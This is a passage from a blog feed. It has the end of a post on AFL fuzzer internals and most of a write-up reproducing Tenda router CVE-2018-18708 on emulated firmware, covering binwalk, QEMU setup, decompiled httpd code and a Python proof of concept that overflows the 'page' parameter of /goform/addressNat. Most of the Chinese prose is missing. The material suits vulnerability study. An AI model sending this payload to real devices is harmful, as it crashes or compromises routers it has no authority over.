class="line">  <span class="comment">/* case</span></span><br><span class="line"><span class="comment">     1.lenqueue_cur-&gt;len</span></span><br><span class="line"><span class="comment">     2.casemmapin_buforig_in</span></span><br><span class="line"><span class="comment">     3.len0out_buf</span></span><br><span class="line"><span class="comment">     4.subseq_tmout</span></span><br><span class="line"><span class="comment">     5.cur_depthqueue_cur-&gt;depth</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  fd = <span class="built_in">open</span>(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) </span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  orig_in = in_buf = <span class="built_in">mmap</span>(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (orig_in == MAP_FAILED)</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to mmap &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could mmap() out_buf as MAP_PRIVATE, but we end up clobbering every</span></span><br><span class="line"><span class="comment">     single byte anyway, so it wouldn&#x27;t give us any performance or memory usage</span></span><br><span class="line"><span class="comment">     benefits. */</span></span><br><span class="line"></span><br><span class="line">  out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br><span class="line">  subseq_tmouts = <span class="number">0</span>;</span><br><span class="line">  cur_depth = queue_cur-&gt;depth;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  <span class="comment">/*******************************************</span></span><br><span class="line"><span class="comment">   * CALIBRATION (only if failed earlier on) *</span></span><br><span class="line"><span class="comment">   *******************************************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* CALIBRATION</span></span><br><span class="line"><span class="comment">     1.3calibrate_case</span></span><br><span class="line"><span class="comment">     2.stop_soonrescrash_mode</span></span><br><span class="line"><span class="comment">        a.cur_skipped_paths1</span></span><br><span class="line"><span class="comment">        b.abandon_entry</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;cal_failed) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Reset exec_cksum to tell calibrate_case to re-execute the testcase</span></span><br><span class="line"><span class="comment">         avoiding the usage of an invalid trace_bits.</span></span><br><span class="line"><span class="comment">         For more info: https://github.com/AFLplusplus/AFLplusplus/pull/425 */</span></span><br><span class="line"></span><br><span class="line">      queue_cur-&gt;exec_cksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      res = <span class="built_in">calibrate_case</span>(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon || res != crash_mode) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/************</span></span><br><span class="line"><span class="comment">   * TRIMMING *</span></span><br><span class="line"><span class="comment">   ************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* TRIMMING</span></span><br><span class="line"><span class="comment">     1.dumb_mode</span></span><br><span class="line"><span class="comment">        a.trim_casequeue_curtrim</span></span><br><span class="line"><span class="comment">        b.queue_cur-&gt;trim_done1</span></span><br><span class="line"><span class="comment">        c.queue_cur-&gt;lenlen</span></span><br><span class="line"><span class="comment">     2.in_buflenout_bufin_buftrim_case</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = <span class="built_in">trim_case</span>(argv, queue_cur, in_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don&#x27;t retry trimming, even if it failed. */</span></span><br><span class="line"></span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len) </span><br><span class="line">        len = queue_cur-&gt;len;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/*********************</span></span><br><span class="line"><span class="comment">   * PERFORMANCE SCORE *</span></span><br><span class="line"><span class="comment">   *********************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* PERFORMANCE SCORE</span></span><br><span class="line"><span class="comment">     1.calculate_scoreorig_perfperf_score</span></span><br><span class="line"><span class="comment">     2.skip_deterministicfuzzpassed_det1fuzz</span></span><br><span class="line"><span class="comment">       havoc_stage</span></span><br><span class="line"><span class="comment">     3.havoc_stage</span></span><br><span class="line"><span class="comment">     4.doing_det1fuzz_one</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  orig_perf = perf_score = <span class="built_in">calculate_score</span>(queue_cur);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip right away if -d is given, if we have done deterministic fuzzing on</span></span><br><span class="line"><span class="comment">     this entry ourselves (was_fuzzed), or if it has gone through deterministic</span></span><br><span class="line"><span class="comment">     testing in earlier, resumed runs (passed_det). */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span></span><br><span class="line"><span class="comment">     for this master instance. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  doing_det = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="mutation"><a href="#mutation" class="headerlink" title="mutation"></a>mutation</h3><p></p><ul><li>bitflip1001</li><li>arithmetic&#x2F;</li><li>interest</li><li>dictionarytoken&#x2F;</li><li>havoc</li><li>splice</li></ul><p>bitflip, arithmetic, interest, dictionarydumb mode-dfuzzer-Mdeterministic fuzzing</p><p>havocsplicefuzzerdumb modefuzzer</p><h3 id="effector-map"><a href="#effector-map" class="headerlink" title="effector map"></a>effector map</h3><p>bytebytedatametadatasize, flagfuzzingeffector mapbyte</p><p>elfmagic num</p><h3 id="havoc"><a href="#havoc" class="headerlink" title="havoc"></a>havoc</h3><p>dumb modefuzzer</p><p>havochavocstacked</p><ul><li>bit</li><li>byteinteresting value</li><li>wordinteresting value</li><li>dwordinteresting value</li><li>byte</li><li>byte</li><li>word</li><li>word</li><li>dword</li><li>dword</li><li>byte</li><li>bytes</li><li>75%25%</li><li>75%25%</li><li>token</li><li>token</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><code>MAP_SIZE=64K</code>AFL</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> Branch cnt | Colliding tuples | Example targets</span><br><span class="line">------------+------------------+-----------------</span><br><span class="line">      <span class="number">1</span>,<span class="number">000</span> | <span class="number">0.75</span>%            | giflib, lzo</span><br><span class="line">      <span class="number">2</span>,<span class="number">000</span> | <span class="number">1.5</span>%             | zlib, tar, xz</span><br><span class="line">      <span class="number">5</span>,<span class="number">000</span> | <span class="number">3.5</span>%             | libpng, libwebp</span><br><span class="line">     <span class="number">10</span>,<span class="number">000</span> | <span class="number">7</span>%               | libxml</span><br><span class="line">     <span class="number">20</span>,<span class="number">000</span> | <span class="number">14</span>%              | sqlite</span><br><span class="line">     <span class="number">50</span>,<span class="number">000</span> | <span class="number">30</span>%              | -</span><br></pre></td></tr></table></figure><p>AFLmap_density</p><p>aflCoverage-guidedifif</p><p> afl_postprocess  AFL_POST_LIBRARY  fuzzer</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://rk700.github.io/2017/12/28/afl-internals/">AFL</a></li><li><a href="https://eternalsakura13.com/2020/08/23/afl/">sakuraAFL</a></li><li><a href="https://hicookie.me/2019/09/18/AFL-Learning/">AFL-Learning</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> #Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tenda-cve</title>
      <link href="/2024/03/21/Tenda-CVE/"/>
      <url>/2024/03/21/Tenda-CVE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>IoT</p></blockquote><span id="more"></span><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><a href="https://github.com/ReFirmLabs/binwalk">binwalk</a>: </p><p>binwalk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -e, --extract                Automatically extract known file types</span></span><br><span class="line"><span class="comment"># -M, --matryoshka             Recursively scan extracted files</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ binwalk -Me xxx.bin</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p><a href="https://github.com/SecureNexusLab/IoTFirmwareAnalysisGuide/blob/main/GuideTutorial/3-%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F.md"></a></p><h4 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu-user"></a>qemu-user</h4><p>qemu-user</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure><h4 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h4><p>QEMU-SystemQEMUCPUQEMU-System</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install qemu-system</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>bridgeIPMACbridge</p><p>IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install uml-utilities bridge-utils net-tools</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ sudo brctl addbr br0</span><br><span class="line"><span class="comment"># add interface</span></span><br><span class="line">$ sudo brctl addif br0 eth0</span><br><span class="line"><span class="comment">#  up</span></span><br><span class="line">$ sudo ifconfig br0 up</span><br><span class="line"><span class="comment"># dhcp IP</span></span><br><span class="line">$ sudo dhclient br0</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ sudo ifconfig br0 down         </span><br><span class="line">$ sudo brctl delbr br0</span><br></pre></td></tr></table></figure><p>iproute2: <a href="https://linux.cn/article-4326-1.html">iproute2  net-tools</a>linuxnet-tools</p><p> <a href="https://wiki.archlinux.org/title/Network_bridge">ArchWiki</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> add name br0 <span class="built_in">type</span> bridge</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> dev br0 up</span><br><span class="line"></span><br><span class="line"><span class="comment"># /</span></span><br><span class="line"><span class="comment"># InterfaceinterfaceUp</span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 master br0</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 nomaster</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip,</span></span><br><span class="line"><span class="comment"># IP address attached toeth1:10.2.3.4/8</span></span><br><span class="line">$ sudo ip address add 10.2.3.4/8 dev br0</span><br></pre></td></tr></table></figure><p>tun</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ip tuntap add dev tap0 mod tap <span class="comment">#  tap </span></span><br><span class="line">$ ip tuntap add dev tun0 mod tun <span class="comment">#  tun</span></span><br></pre></td></tr></table></figure><h5 id="chroot"><a href="#chroot" class="headerlink" title="chroot"></a>chroot</h5><p><a href="https://people.debian.org/~aurel32/qemu">aurel32&#x2F;qemu</a>qemu-system</p><ul><li>kernel: zImage  linux kernel</li><li>inited: ramdisk </li><li>drive: </li><li>net</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap,ifname=br0,script=no,downscript=no \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><h4 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h4><p><a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a>: <a href="https://github.com/firmadyne/firmadyne">firmadyne</a></p><p>binwalk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line">$ <span class="built_in">cd</span> firmware-analysis-toolkit</span><br><span class="line">$ ./setup.sh</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fat.py xxx.bin</span><br></pre></td></tr></table></figure><h4 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h4><p>Unicorn  CPU </p><p><a href="https://github.com/unicorn-engine/unicorn">unicorn: Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, PowerPC, RiscV, S390x, TriCore, X86) </a></p><h4 id="Qiling"><a href="#Qiling" class="headerlink" title="Qiling"></a>Qiling</h4><p>qilingUnicorn</p><p><a href="https://github.com/qilingframework/qiling">qiling: A True Instrumentable Binary Emulation Framework</a></p><p>docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/qilingframework/qiling</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ <span class="built_in">cd</span> qiling &amp;&amp; git submodule update --init --recursive pip3 install .</span><br><span class="line">$ pip3 install .</span><br></pre></td></tr></table></figure><h2 id="ghidra"><a href="#ghidra" class="headerlink" title="ghidra"></a>ghidra</h2><p>mipsghidra</p><p>Linuxwindowsrelease</p><p><code>build/dist/</code>release</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; gradle -I gradle/support/fetchDependencies.gradle init</span><br><span class="line">PS&gt; gradle buildGhidra</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://github.com/re1wn/IoT-fstm/blob/main/IoT-project/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97.md"></a></p><ol><li>uart</li><li></li><li></li><li></li></ol><h2 id="IDA-plugins"><a href="#IDA-plugins" class="headerlink" title="IDA plugins"></a>IDA plugins</h2><p>IDAurl<a href="https://hex-rays.com/contests_details/contest2023/">Plug-In Contest</a></p><p></p><h2 id="tenda"><a href="#tenda" class="headerlink" title="tenda"></a>tenda</h2><ul><li><a href="https://www.tenda.com.cn/download/default.html">_</a></li><li><a href="https://www.tendacn.com/download/default.html">Download_Tenda-All For Better NetWorking</a></li></ul><h3 id="CVE-2018-18708"><a href="#CVE-2018-18708" class="headerlink" title="CVE-2018-18708"></a>CVE-2018-18708</h3><p><a href="https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Tenda CVE-2018-18708 </a></p><p>: <a href="https://www.tenda.com.cn/download/detail-2680.html">AC15 V15.03.05.19</a></p><p>bin&#x2F;httpdwebhttpd  post <code>fromAddressNat</code><code>page</code> sprintf </p><p><code>entrys</code><code>mitInterface</code><code>page</code>pagesprintfv6 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">fromAddressNat</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [sp+14h] [bp-418h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [sp+114h] [bp-318h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+314h] [bp-118h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [sp+414h] [bp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [sp+418h] [bp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// [sp+41Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  v9 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;entrys&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;mitInterface&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%s;%s&quot;</span>, v9, v8);</span><br><span class="line">  <span class="built_in">sub_4EC58</span>(<span class="string">&quot;adv.addrnat&quot;</span>, s, <span class="number">126</span>);</span><br><span class="line">  v7 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;page&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">sprintf</span>(v6, <span class="string">&quot;advance/addressNatList.asp?page=%s&quot;</span>, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">CommitCfm</span>(v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(v4, <span class="string">&quot;advance_type=%d&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">send_msg_to_netctrl</span>(<span class="number">5</span>, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_2BE4C</span>(a1, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_42378</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;GetStaticRouteCfg&quot;</span>, formGetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;SetStaticRouteCfg&quot;</span>, fromSetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;addressNat&quot;</span>, fromAddressNat);</span><br><span class="line">  <span class="built_in">sub_10120</span>(<span class="string">&quot;mNatGetStatic&quot;</span>, mNatGetStatic);</span><br><span class="line">  <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>http</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp $(which qemu-arm-<span class="type">static</span>) .</span><br><span class="line">$ sudo chroot . ./qemu-arm-<span class="type">static</span> bin/httpd</span><br></pre></td></tr></table></figure><p>patch</p><p>br0<a href="https://blog.csdn.net/song_lee/article/details/113800058">Tenda AC15 </a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> add br0 <span class="built_in">type</span> bridge</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 br0 master</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> br0 up</span><br><span class="line">sudo ip addr add dev br0 192.168.85.200/24 </span><br></pre></td></tr></table></figure><p>cfm fail: patch</p><ul><li><a href="https://blog.csdn.net/FigBB/article/details/134856961">ida proApply patches topatching canceled..</a></li></ul><p>Cookie: password&#x3D;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /main.html HTTP/1.1</span><br><span class="line">Host: 192.168.85.131</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: password=hamster</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: </span><br></pre></td></tr></table></figure><p>PoCsegment faultIP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.85.131&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] connecting&#x27;</span>)</span><br><span class="line">r.connect((ip, port))</span><br><span class="line">li(<span class="string">&#x27;[+] connect finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;page=&#x27;</span> + p1</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b&quot;POST /goform/addressNat&quot;</span> + <span class="string">b&quot; HTTP/1.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Host: 192.168.0.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Language: en-US,en;q=0.5&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Encoding: gzip, deflate&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Cookie: password=hum1qw&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Connection: close&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Upgrade-Insecure-Requests: 1&quot;</span> + rn</span><br><span class="line">p3 += (<span class="string">b&quot;Content-Length: %d&quot;</span> % <span class="built_in">len</span>(p2)) +rn</span><br><span class="line">p3 += <span class="string">b&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>+rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += p2</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] sendling payload&#x27;</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">response = r.recv(<span class="number">4096</span>)</span><br><span class="line">response = response.decode()</span><br><span class="line">li(response)</span><br></pre></td></tr></table></figure><p></p><p>qemugdbserver</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo qemu-arm-static -g 1234 -L 